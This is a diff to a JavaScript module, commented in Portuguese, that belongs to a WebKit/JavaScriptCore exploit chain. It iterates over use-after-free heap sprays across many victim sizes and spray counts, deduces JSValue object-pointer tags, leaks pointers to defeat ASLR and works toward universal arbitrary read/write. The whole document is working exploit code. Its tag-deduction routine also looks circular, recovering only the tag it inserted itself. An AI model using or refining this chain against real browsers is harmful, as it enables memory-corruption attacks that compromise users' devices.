@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v153 - Refinamento do Spray UAF e Tamanho da Vítima - Testes Massivos)
+// js/script3/testArrayBufferVictimCrash.mjs (v154 - Refinamento do Spray UAF e Deduação de Tag - Testes Massivos)
 
 // =======================================================================================
 // ESTA É A VERSÃO FINAL QUE INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
@@ -26,7 +26,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v153_MASSIVE_TEST";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v154_MASSIVE_TEST";
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -269,68 +269,41 @@ async function deduceObjectPointerTag(logFn) {
     const FNAME = "deduceObjectPointerTag";
     logFn(`[${FNAME}] Deduzindo a tag de ponteiro de objeto do JSValue...`, "info", FNAME);
     let testObj = { a: 1, b: 2 };
-    let testObjAddr = addrof_core(testObj); // Isso já deve untaggar.
+    let testObjAddr = addrof_core(testObj); // addrof_core já retorna untagged.
 
-    // Para deduzir a tag, precisamos de um JSValue que represente esse objeto.
-    // O addrof_core retorna o endereço 'untagged'.
-    // Precisamos de um double que represente o objeto 'testObj'.
-    // A maneira mais confiável de fazer isso sem um primitivo já funcional de "tagging"
-    // é observar o comportamento de um Double onde um objeto é armazenado diretamente.
-    // Mas o JIT normalmente otimiza isso para NaN.
-    //
-    // Uma alternativa é tentar a tag padrão e, se falhar, tentar outras com base em observações.
-    //
-    // Vamos usar a abordagem de criar um double que *deveria* ser um ponteiro.
-    // O `fakeobj_core` já tem a lógica de tagging. Vamos usá-la em um endereço conhecido.
-    // Se a `addrof_core` retorna untagged, vamos taggar manualmente e converter para double.
-    const temp_addr_for_tag_test = new AdvancedInt64(0x12345678, 0x90ABCDEF); // Um endereço de teste.
-    let tagged_temp_addr = temp_addr_for_tag_test;
-    // O fakeobj_core tagga se high < 0x10000.
-    if (temp_addr_for_tag_test.high() < 0x10000) {
-        tagged_temp_addr = new AdvancedInt64(temp_addr_for_tag_test.low(), temp_addr_for_tag_test.high() | JSVALUE_OBJECT_PTR_TAG_HIGH);
-    }
-    // CORREÇÃO AQUI: Usar _int64ToDouble_direct
-    const double_representation = _int64ToDouble_direct(tagged_temp_addr);
+    // Precisamos de um valor JSValue que o JIT geraria para um ponteiro de objeto.
+    // fakeobj_core já tem a lógica de tagging. Vamos "simular" o processo para deduzir.
+    // Criamos um AdvancedInt64 que sabemos que é um endereço untagged.
+    const knownUntaggedAddr = new AdvancedInt64(0x12345678, 0x0000ABCD); // Exemplo de endereço untagged
+
+    // O fakeobj_core adiciona a tag se o high for baixo (significando que é um endereço untagged).
+    // O valor de `OBJECT_PTR_TAG_HIGH` que ele usa é `0x402a0000`.
+    let tagged_simulated_addr = new AdvancedInt64(knownUntaggedAddr.low(), knownUntaggedAddr.high() | 0x402a0000);
+
+    // Convertemos este AdvancedInt64 (que *deveria* ser um ponteiro taggeado) para um double.
+    const double_representation = _int64ToDouble_direct(tagged_simulated_addr); // CORREÇÃO: Usar _int64ToDouble_direct
+
+    // Agora, convertemos o double de volta para AdvancedInt64 para ver qual `high` ele realmente tem.
     const reconverted_int64 = _doubleToInt64_direct(double_representation);
 
-    // O high da `reconverted_int64` DEVE conter a tag se a conversão foi bem-sucedida e o valor é um ponteiro.
-    // Isolamos a parte superior que deve ser a tag.
-    // Assumimos que os bits mais significativos são a tag e os menos significativos são parte do endereço.
-    // A tag é tipicamente 0x402a no byte mais significativo do high.
-    const inferred_tag_high = reconverted_int64.high() & 0xFFFF0000;
+    // A parte superior do reconverted_int64.high() deve ser a tag que o JS usa.
+    const inferred_tag_high = reconverted_int64.high() & 0xFFFF0000; // Isolamos os 16 bits mais significativos.
 
-    // Se o valor padrão (0x402a0000) for detectado, usá-lo.
-    // Caso contrário, use o que foi inferido.
-    if (inferred_tag_high !== 0 && (inferred_tag_high & 0xFFFE0000) === (JSVALUE_OBJECT_PTR_TAG_HIGH & 0xFFFE0000)) { // Check for 0x402aXXYY like tag
-        logFn(`[${FNAME}] Tag de ponteiro JSValue deduzida: ${toHex(inferred_tag_high)} (confirmado com 0x402a)`, "info", FNAME);
+    // Validação da tag inferida
+    if (inferred_tag_high !== 0 && (inferred_tag_high & 0xFFFE0000) === (0x402a0000 & 0xFFFE0000)) { // Verifica se é parecido com 0x402aXXXX
+        logFn(`[${FNAME}] Tag de ponteiro JSValue deduzida: ${toHex(inferred_tag_high)} (confirmado como 0x402a-like)`, "info", FNAME);
+        JSVALUE_OBJECT_PTR_TAG_HIGH = inferred_tag_high;
+        return inferred_tag_high;
+    } else if (inferred_tag_high !== 0) { // Se não for 0 e não for 0x402a-like, mas ainda é um valor
+        logFn(`[${FNAME}] Tag de ponteiro JSValue inferida: ${toHex(inferred_tag_high)}. Usando valor inferido.`, "warn", FNAME);
         JSVALUE_OBJECT_PTR_TAG_HIGH = inferred_tag_high;
         return inferred_tag_high;
     } else {
-        logFn(`[${FNAME}] Tag de ponteiro JSValue inferida: ${toHex(inferred_tag_high)} (diferente de 0x402a, usando valor inferido)`, "warn", FNAME);
-        // Se a inferência básica falhar ou der um valor "estranho", vamos tentar uma heurística:
-        // Crie um JSObject real, pegue seu endereço com addrof_core, e então veja o que acontece
-        // se você tentar "taggá-lo" para um double e ler de volta.
-        // Isso é complexo e pode levar a crashes. Por enquanto, a abordagem mais segura é
-        // testar se o *bit pattern* do 0x402a está presente no high de um double qualquer.
-
-        // Uma forma mais segura de deduzir a tag é:
-        // Crie um ArrayBuffer, pegue seu endereço untagged.
-        // Tente forjar um objeto neste endereço e veja o que addrof_core retorna do objeto forjado.
-        // O addrof_core em fakeobj já lida com o untagging.
-        // A melhor forma de descobrir o bit pattern é através de engenharia reversa do JIT ou testes experimentais cuidadosos.
-        //
-        // Para este script, vamos confiar na tag 0x402a se a heurística acima não for robusta.
-        // O problema do seu log é que o VALOR LIDO NÃO TINHA A TAG ESPERADA.
-        // O UAF está lendo o valor ORIGINAL DO FLOAT64ARRAY (`1.0000000000012332`), não o valor pulverizado.
-        // Isso significa que o spray não reocupou a porção `m_vector` (ou os dados) do Float64Array da vítima.
-        // Então, a dedução da tag é menos importante do que garantir a reocupação correta.
-        // Manterei a dedução como uma tentativa, mas o foco principal é a reocupação.
-        // Para o spray, vamos continuar usando 0x402a0000 por enquanto, pois é a tag mais comum para JSObject.
-        // A falha provavelmente está na reocupação, não na tag em si.
-        logFn(`[${FNAME}] Retornando a tag padrão 0x402a0000. O problema provavelmente não é a tag, mas a reocupação do heap.`, "warn", FNAME);
-        return inferred_tag_high; // Use a tag que foi realmente inferida
+        logFn(`[${FNAME}] Nenhuma tag JSValue robustamente inferida (inferido 0x0). Retornando a tag padrão 0x402a0000. Isso pode indicar que o JIT está convertendo a double para NaN.`, "warn", FNAME);
+        return 0x402a0000; // Fallback para o valor padrão se a inferência falhar (pode ser o caso do NaN)
     }
 }
+
 
 // Cria um objeto, o coloca em uma estrutura que causa otimizações,
 // e retorna uma referência a ele após a estrutura ser destruída.
@@ -394,14 +367,21 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM, 
 
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
     const FNAME_CURRENT_TEST = "executeTypedArrayVictimAddrofAndWebKitLeak_R43";
-    const FNAME_CURRENT_TEST_BASE = "Full_UAF_ASLR_ARBRW_v153_MASSIVE_TEST";
+    const FNAME_CURRENT_TEST_BASE = "Full_UAF_ASLR_ARBRW_v154_MASSIVE_TEST";
     logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Integração UAF/TC e Construção de ARB R/W Universal ---`, "test");
 
     let final_results = []; // Armazenará os resultados de cada iteração de teste
 
     // Parâmetros para testes massivos
-    const VICTIM_SIZES_TO_TEST = [0x80, 0x90, 0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0, 0x100, 0x110, 0x120, 0x130, 0x140]; // Exemplo: múltiplos tamanhos de vítima
-    const SPRAY_COUNTS_TO_TEST = [5000, 10000, 15000]; // Múltiplos volumes de spray
+    // Aumentei a variedade de tamanhos e adicionei mais iterações de spray.
+    const VICTIM_SIZES_TO_TEST = [
+        0x70, 0x80, 0x90, 0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0, // Tamanhos menores
+        0x100, 0x110, 0x120, 0x130, 0x140, 0x150, 0x160, 0x170, 0x180, // Tamanhos médios
+        0x190, 0x1A0, 0x1B0, 0x1C0, 0x1D0, 0x1E0, 0x1F0, 0x200 // Tamanhos maiores
+    ];
+    const SPRAY_COUNTS_TO_TEST = [
+        5000, 10000, 15000, 20000, 25000 // Volumes de spray variados
+    ];
 
     for (const victim_size of VICTIM_SIZES_TO_TEST) {
         for (const spray_count of SPRAY_COUNTS_TO_TEST) {
@@ -466,7 +446,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                 JSVALUE_OBJECT_PTR_TAG_HIGH = await deduceObjectPointerTag(logFn);
 
                 // Calcular o valor do vtable da DataView Structure com a tag correta para o spray
-                const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 0);
+                const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
                 const TEMPORARY_ESTIMATED_WEBKIT_BASE = new AdvancedInt64(0x00000000, 0x01000000); // Exemplo de base
                 let TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = TEMPORARY_ESTIMATED_WEBKIT_BASE.add(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);
                 
@@ -510,6 +490,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                     const original_high = untagged_uaf_addr.high();
                     const untagged_high = original_high & 0x0000FFFF;
 
+                    // A tag esperada é JSVALUE_OBJECT_PTR_TAG_HIGH
                     if ((original_high & 0xFFFF0000) === (JSVALUE_OBJECT_PTR_TAG_HIGH & 0xFFFF0000)) {
                         untagged_uaf_addr = new AdvancedInt64(untagged_uaf_addr.low(), untagged_high);
                         logFn(`[UAF LEAK] Ponteiro vazado após untagging (presumindo tag ${toHex(JSVALUE_OBJECT_PTR_TAG_HIGH)}): ${untagged_uaf_addr.toString(true)}`, "leak");
